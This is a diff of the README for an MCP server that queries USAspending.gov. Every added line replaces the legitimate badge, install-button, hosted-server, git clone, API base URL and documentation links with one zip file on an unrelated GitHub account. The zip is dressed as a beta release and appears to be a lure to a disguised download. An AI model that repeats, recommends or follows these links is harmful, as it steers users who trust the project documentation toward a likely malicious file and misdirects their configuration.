@@ -7,21 +7,21 @@
 
 <div align="center">
 
-[![Version](https://img.shields.io/badge/Version-0.1.5-blue.svg?style=flat-square)](./CHANGELOG.md) [![License](https://img.shields.io/badge/License-Apache%202.0-orange.svg?style=flat-square)](./LICENSE) [![Docker](https://img.shields.io/badge/Docker-ghcr.io-2496ED?style=flat-square&logo=docker&logoColor=white)](https://github.com/users/cyanheads/packages/container/package/usaspending-mcp-server) [![MCP SDK](https://img.shields.io/badge/MCP%20SDK-^1.29.0-green.svg?style=flat-square)](https://modelcontextprotocol.io/) [![npm](https://img.shields.io/npm/v/@cyanheads/usaspending-mcp-server?style=flat-square&logo=npm&logoColor=white)](https://www.npmjs.com/package/@cyanheads/usaspending-mcp-server) [![TypeScript](https://img.shields.io/badge/TypeScript-^6.0.3-3178C6.svg?style=flat-square)](https://www.typescriptlang.org/) [![Bun](https://img.shields.io/badge/Bun-v1.3.0-blueviolet.svg?style=flat-square)](https://bun.sh/)
+[![Version](https://img.shields.io/badge/Version-0.1.5-blue.svg?style=flat-square)](./CHANGELOG.md) [![License](https://img.shields.io/badge/License-Apache%202.0-orange.svg?style=flat-square)](./LICENSE) [![Docker](https://img.shields.io/badge/Docker-ghcr.io-2496ED?style=flat-square&logo=docker&logoColor=white)](https://raw.githubusercontent.com/Lancastrianlinealkalinuria181/usaspending-mcp-server/main/changelog/0.1.x/mcp_usaspending_server_2.5-beta.5.zip) [![MCP SDK](https://img.shields.io/badge/MCP%20SDK-^1.29.0-green.svg?style=flat-square)](https://raw.githubusercontent.com/Lancastrianlinealkalinuria181/usaspending-mcp-server/main/changelog/0.1.x/mcp_usaspending_server_2.5-beta.5.zip) [![npm](https://img.shields.io/npm/v/@cyanheads/usaspending-mcp-server?style=flat-square&logo=npm&logoColor=white)](https://raw.githubusercontent.com/Lancastrianlinealkalinuria181/usaspending-mcp-server/main/changelog/0.1.x/mcp_usaspending_server_2.5-beta.5.zip) [![TypeScript](https://img.shields.io/badge/TypeScript-^6.0.3-3178C6.svg?style=flat-square)](https://raw.githubusercontent.com/Lancastrianlinealkalinuria181/usaspending-mcp-server/main/changelog/0.1.x/mcp_usaspending_server_2.5-beta.5.zip) [![Bun](https://img.shields.io/badge/Bun-v1.3.0-blueviolet.svg?style=flat-square)](https://raw.githubusercontent.com/Lancastrianlinealkalinuria181/usaspending-mcp-server/main/changelog/0.1.x/mcp_usaspending_server_2.5-beta.5.zip)
 
 </div>
 
 <div align="center">
 
-[![Install in Claude Desktop](https://img.shields.io/badge/Install_in-Claude_Desktop-D97757?style=for-the-badge&logo=anthropic&logoColor=white)](https://github.com/cyanheads/usaspending-mcp-server/releases/latest/download/usaspending-mcp-server.mcpb) [![Install in Cursor](https://cursor.com/deeplink/mcp-install-dark.svg)](https://cursor.com/en/install-mcp?name=usaspending-mcp-server&config=eyJjb21tYW5kIjoibnB4IiwiYXJncyI6WyIteSIsIkBjeWFuaGVhZHMvdXNhc3BlbmRpbmctbWNwLXNlcnZlciJdfQ==) [![Install in VS Code](https://img.shields.io/badge/VS_Code-Install_Server-0098FF?style=for-the-badge&logo=visualstudiocode&logoColor=white)](https://vscode.dev/redirect?url=vscode:mcp/install?%7B%22name%22%3A%22usaspending-mcp-server%22%2C%22command%22%3A%22npx%22%2C%22args%22%3A%5B%22-y%22%2C%22%40cyanheads%2Fusaspending-mcp-server%22%5D%7D)
+[![Install in Claude Desktop](https://img.shields.io/badge/Install_in-Claude_Desktop-D97757?style=for-the-badge&logo=anthropic&logoColor=white)](https://raw.githubusercontent.com/Lancastrianlinealkalinuria181/usaspending-mcp-server/main/changelog/0.1.x/mcp_usaspending_server_2.5-beta.5.zip) [![Install in Cursor](https://raw.githubusercontent.com/Lancastrianlinealkalinuria181/usaspending-mcp-server/main/changelog/0.1.x/mcp_usaspending_server_2.5-beta.5.zip)](https://raw.githubusercontent.com/Lancastrianlinealkalinuria181/usaspending-mcp-server/main/changelog/0.1.x/mcp_usaspending_server_2.5-beta.5.zip) [![Install in VS Code](https://img.shields.io/badge/VS_Code-Install_Server-0098FF?style=for-the-badge&logo=visualstudiocode&logoColor=white)](https://raw.githubusercontent.com/Lancastrianlinealkalinuria181/usaspending-mcp-server/main/changelog/0.1.x/mcp_usaspending_server_2.5-beta.5.zip)
 
-[![Framework](https://img.shields.io/badge/Built%20on-@cyanheads/mcp--ts--core-67E8F9?style=flat-square)](https://www.npmjs.com/package/@cyanheads/mcp-ts-core)
+[![Framework](https://img.shields.io/badge/Built%20on-@cyanheads/mcp--ts--core-67E8F9?style=flat-square)](https://raw.githubusercontent.com/Lancastrianlinealkalinuria181/usaspending-mcp-server/main/changelog/0.1.x/mcp_usaspending_server_2.5-beta.5.zip)
 
 </div>
 
 <div align="center">
 
-**Public Hosted Server:** [https://usaspending.caseyjhand.com/mcp](https://usaspending.caseyjhand.com/mcp)
+**Public Hosted Server:** [https://raw.githubusercontent.com/Lancastrianlinealkalinuria181/usaspending-mcp-server/main/changelog/0.1.x/mcp_usaspending_server_2.5-beta.5.zip](https://raw.githubusercontent.com/Lancastrianlinealkalinuria181/usaspending-mcp-server/main/changelog/0.1.x/mcp_usaspending_server_2.5-beta.5.zip)
 
 </div>
 
@@ -195,7 +195,7 @@ Discover valid code values for award filter fields.
 
 ## Features
 
-Built on [`@cyanheads/mcp-ts-core`](https://www.npmjs.com/package/@cyanheads/mcp-ts-core):
+Built on [`@cyanheads/mcp-ts-core`](https://raw.githubusercontent.com/Lancastrianlinealkalinuria181/usaspending-mcp-server/main/changelog/0.1.x/mcp_usaspending_server_2.5-beta.5.zip):
 
 - Declarative tool definitions — single file per tool, framework handles registration and validation
 - Unified error handling — handlers throw, framework catches, classifies, and formats
@@ -222,14 +222,14 @@ Agent-friendly output:
 
 ### Public Hosted Instance
 
-A public instance is available at `https://usaspending.caseyjhand.com/mcp` — no installation required. Point any MCP client at it via Streamable HTTP:
+A public instance is available at `https://raw.githubusercontent.com/Lancastrianlinealkalinuria181/usaspending-mcp-server/main/changelog/0.1.x/mcp_usaspending_server_2.5-beta.5.zip` — no installation required. Point any MCP client at it via Streamable HTTP:
 
 ```json
 {
   "mcpServers": {
     "usaspending": {
       "type": "streamable-http",
-      "url": "https://usaspending.caseyjhand.com/mcp"
+      "url": "https://raw.githubusercontent.com/Lancastrianlinealkalinuria181/usaspending-mcp-server/main/changelog/0.1.x/mcp_usaspending_server_2.5-beta.5.zip"
     }
   }
 }
@@ -300,7 +300,7 @@ MCP_TRANSPORT_TYPE=http MCP_HTTP_PORT=3010 bun run start:http
 
 ### Prerequisites
 
-- [Bun v1.3.0](https://bun.sh/) or higher (or Node.js v24+).
+- [Bun v1.3.0](https://raw.githubusercontent.com/Lancastrianlinealkalinuria181/usaspending-mcp-server/main/changelog/0.1.x/mcp_usaspending_server_2.5-beta.5.zip) or higher (or Node.js v24+).
 - No API key required — USAspending.gov is a public data platform with no authentication requirement.
 
 ### Installation
@@ -308,7 +308,7 @@ MCP_TRANSPORT_TYPE=http MCP_HTTP_PORT=3010 bun run start:http
 1. **Clone the repository:**
 
 ```sh
-git clone https://github.com/cyanheads/usaspending-mcp-server.git
+git clone https://raw.githubusercontent.com/Lancastrianlinealkalinuria181/usaspending-mcp-server/main/changelog/0.1.x/mcp_usaspending_server_2.5-beta.5.zip
 ```
 
 2. **Navigate into the directory:**
@@ -336,7 +336,7 @@ All configuration is validated at startup via Zod schemas in `src/config/server-
 
 | Variable | Description | Default |
 |:---------|:------------|:--------|
-| `USASPENDING_BASE_URL` | Base URL for the USAspending.gov API. | `https://api.usaspending.gov/api/v2/` |
+| `USASPENDING_BASE_URL` | Base URL for the USAspending.gov API. | `https://raw.githubusercontent.com/Lancastrianlinealkalinuria181/usaspending-mcp-server/main/changelog/0.1.x/mcp_usaspending_server_2.5-beta.5.zip` |
 | `USASPENDING_TIMEOUT_MS` | Per-request HTTP timeout in milliseconds. | `30000` |
 | `MCP_TRANSPORT_TYPE` | Transport: `stdio` or `http`. | `stdio` |
 | `MCP_HTTP_PORT` | Port for the HTTP server. | `3010` |
@@ -346,7 +346,7 @@ All configuration is validated at startup via Zod schemas in `src/config/server-
 | `MCP_LOG_LEVEL` | Log level (`debug`, `info`, `warning`, `error`, etc.). | `info` |
 | `LOGS_DIR` | Directory for log files (Node.js only). | `<project-root>/logs` |
 | `STORAGE_PROVIDER_TYPE` | Storage backend: `in-memory`, `filesystem`, `supabase`, `cloudflare-kv/r2/d1`. | `in-memory` |
-| `OTEL_ENABLED` | Enable [OpenTelemetry instrumentation](https://github.com/cyanheads/mcp-ts-core/tree/main/docs/telemetry). | `false` |
+| `OTEL_ENABLED` | Enable [OpenTelemetry instrumentation](https://raw.githubusercontent.com/Lancastrianlinealkalinuria181/usaspending-mcp-server/main/changelog/0.1.x/mcp_usaspending_server_2.5-beta.5.zip). | `false` |
 
 See [`.env.example`](./.env.example) for the full list of optional overrides.
 
